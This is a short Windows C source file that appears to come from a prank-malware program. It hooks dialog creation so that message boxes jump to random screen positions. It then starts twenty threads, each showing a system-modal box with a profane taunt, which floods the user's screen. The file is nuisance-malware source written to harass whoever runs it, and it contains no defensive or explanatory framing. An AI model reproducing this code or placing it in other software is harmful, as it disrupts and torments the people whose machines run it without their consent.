#include "main.h"

HCRYPTPROV prov;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode < 0)
        return CallNextHookEx(0, nCode, wParam, lParam);
    CWPRETSTRUCT *msg = (CWPRETSTRUCT *)lParam;

    if (msg->message == WM_INITDIALOG)
    {
        int X = random() % GetSystemMetrics(SM_CXSCREEN);
        int Y = random() % GetSystemMetrics(SM_CYSCREEN);
        SetWindowPos(msg->hwnd, 0, X, Y, 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI ripMessageThread(LPVOID parameter)
{
    HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, msgBoxHook, 0, GetCurrentThreadId());
    MessageBoxA(NULL, "GETFUCKED", "lol", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
    Sleep(1000);
    UnhookWindowsHookEx(hook);

    return 0;
}

void lolMsgBox()
{
    for (int i = 0; i < 20; i++)
    {
        CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
        Sleep(100);
    }
}
